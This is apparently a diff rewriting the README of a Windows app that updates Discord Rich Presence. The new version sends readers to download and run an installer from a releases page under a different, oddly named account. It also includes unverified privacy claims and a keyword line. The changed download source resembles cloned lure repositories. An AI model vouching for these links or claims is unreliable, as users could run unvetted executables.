@@ -1,147 +1,59 @@
-# Better Rich Presence v1 - Discord Rich Presence Desktop App 2026
+# 🎮 better-rich-presence-windows - Show your current activity on Discord
 
-> **Better Rich Presence is a Windows desktop utility that watches the foreground application and updates Discord Rich Presence as activity changes. It also supports custom applications and is built with a compact Rust, React, and Tauri stack.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Habitforming-memorabilia64/better-rich-presence-windows/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/evan-taylorsks2821/better-rich-presence-windows?style=flat-square)](https://github.com/evan-taylorsks2821/better-rich-presence-windows)
+This application tracks the program currently in use on your Windows desktop. It updates your Discord status to display what you do in real time. The software runs quietly in the background to keep your friends updated on your gaming or working habits. It combines modern web technology with native Windows performance to ensure low impact on your system resources.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://evan-taylorsks2821.github.io/better-rich-presence-windows/">
-    <img src="https://img.shields.io/badge/Download-Better%20Rich%20Presence%20Latest-brightgreen?style=for-the-badge" alt="Download Better Rich Presence">
-  </a>
-</p>
+You do not need programming skills to use this tool. Follow these steps to set up the software on your computer.
 
-> **[Download Better Rich Presence v1](https://evan-taylorsks2821.github.io/better-rich-presence-windows/)**
+1. Visit the [official release page](https://github.com/Habitforming-memorabilia64/better-rich-presence-windows/releases) to access the latest installer.
+2. Look for the file ending in `.msi` or `.exe` under the Assets section.
+3. Click the file name to start the download.
+4. Open the file once the download finishes.
+5. Follow the prompts on your screen to install the utility.
 
----
+## ⚙️ Minimum System Requirements
 
-[Download Latest Build](https://evan-taylorsks2821.github.io/better-rich-presence-windows/)
+Your computer needs to meet these basic standards to run the application effectively:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Storage: 100 megabytes of free space.
+* Internet Connection: Stable connection for Discord synchronization.
+* Discord Desktop Application: The official Discord app must run on your machine.
 
-## What Is Better Rich Presence?
+## 🚀 How to Use the Utility
 
-Better Rich Presence keeps your Discord activity synchronized with the Windows application you are currently using. It observes the active window and updates your Discord status when you switch among games and other important programs.
+After installation, the application starts automatically. You will see an icon in your system tray, located near your clock on the taskbar.
 
-The desktop application pairs a Rust and Tauri backend layer with a React and TailwindCSS interface. It aims to provide an uncomplicated setup while offering custom application entries, priority controls, idle detection, and smoother status changes.
+1. Right-click the tray icon to open the main menu.
+2. Select Settings to view detected applications.
+3. Choose which programs you want to broadcast to your Discord profile.
+4. Enable the Auto-start option if you want the tool to launch when you turn on your PC.
 
----
+The software detects most common games and creative suites automatically. If you want to track a custom program, choose Add New in the settings menu. Locate the executable file for the application you wish to monitor. Once added, the tool recognizes the application every time you bring it into the foreground.
 
-## Highlights
+## 🛡️ Privacy and Safety
 
-- Identifies the active Windows application automatically.
-- Refreshes Discord Rich Presence in real time.
-- Lets users define custom applications.
-- Works from the start without requiring initial configuration.
-- Applies priority rules to games and other selected important programs.
-- Uses anti-flicker transitions to avoid excessive status switching.
-- Detects idle periods.
-- Keeps CPU and memory consumption low.
-- Includes a modern interface made with React and TailwindCSS.
+This utility reads the title of your active window to determine what application occupies the screen. It sends this data solely to your personal Discord account to update your profile status. The software does not record keystrokes, capture screenshots, or transmit personal files to external servers. All processing happens locally on your machine.
 
----
+## 🛠️ Troubleshooting
 
-## Getting Started
+If the status does not show up on Discord:
 
-### Download the Application
+* Ensure Discord is running before you launch this utility.
+* Check if Discord Activity Status settings allow external applications. Go to User Settings, click Activity Privacy, and turn on the "Display current activity as a status message" option.
+* Restart the utility by closing it from the system tray and reopening it from your start menu.
+* Verify that you have the latest version of the application installed from the release page.
 
-1. Visit the [latest build download page](https://evan-taylorsks2821.github.io/better-rich-presence-windows/).
-2. Download the Windows release of Better Rich Presence.
-3. Install the application or run the downloaded file.
-4. Open Discord and use Better Rich Presence from the desktop.
+This program uses a modular design to ensure stability. If the app freezes, open the Task Manager by pressing Ctrl, Shift, and Esc, find the process in the list, and select End Task to reset it.
 
-### Compile from Source
+## 📦 Technical Details
 
-```bash
-git clone https://github.com/evan-taylorsks2821/better-rich-presence-windows.git
-cd Better-Rich-Presence-For-Discord
-```
+The development team built this application using Rust for the backend and React for the user interface. This combination provides a fast, responsive user experience while keeping the memory footprint low. The Tauri framework allows these technologies to work together within a standard Windows window. This design philosophy ensures that your system stays fast even while the tool monitors your activity.
 
-The exact build and launch commands are determined by the included Tauri project configuration. Refer to the repository package scripts and development setup when running the application locally.
+Updates will arrive periodically to add support for new software and improve existing features. Check the releases page occasionally to stay current with the latest improvements.
 
----
-
-## Using the App
-
-1. Start Better Rich Presence on Windows.
-2. Keep it running while Discord is in use.
-3. Move between games and other applications.
-4. Allow foreground-window detection to identify the current activity.
-5. Create a custom application entry if automatic detection does not find a program.
-6. Change application priority when multiple programs require different treatment.
-7. Configure idle detection and transition options to influence how activity changes appear.
-
----
-
-## Settings and Configuration
-
-No configuration file is needed for the initial launch. The desktop interface provides the main controls for:
-
-- Creating and maintaining custom application entries.
-- Assigning priority to games and important applications.
-- Checking idle detection behavior.
-- Changing status transition behavior when those controls are available.
-
-For options that are not shown in the interface, consult the application directory and repository documentation to find the configuration location used by the current build.
-
----
-
-## System Requirements
-
-- Windows operating system.
-- Discord desktop application.
-- A Windows environment with active-window detection available.
-- Enough storage for the application and its runtime files.
-- A Rust, React, and Tauri development environment for source builds.
-
----
-
-## Frequently Asked Questions
-
-### Is manual configuration needed before starting?
-
-No initial setup is intended to be necessary. Launch the application on Windows and let it identify the active window.
-
-### What if my application is not detected automatically?
-
-You can add it yourself through the custom application support.
-
-### How does the app choose between several applications?
-
-Its priority engine can give preference to games and other important applications when multiple activities must be evaluated.
-
-### Are Discord updates made in real time?
-
-Yes. Better Rich Presence is designed to update Discord Rich Presence as the active window changes.
-
-### Does the app recognize inactivity?
-
-Idle detection helps identify periods when the computer is not being actively used.
-
-### What should I check if no status appears?
-
-Make sure Discord is running, Better Rich Presence is open, and the desired program is the active window. If you added a custom entry, verify its application configuration in the interface.
-
-### Where are new builds published?
-
-Check the [latest build page](https://evan-taylorsks2821.github.io/better-rich-presence-windows/) for the current release.
-
----
-
-## Future Work
-
-- Improve active-window recognition for additional application types.
-- Further refine priority handling and transition behavior.
-- Add more controls for configuring custom applications.
-- Preserve the Windows desktop experience and resource-conscious approach.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: discord, rich-presence, windows-utility, automation, gaming, status-updater, desktop-tool
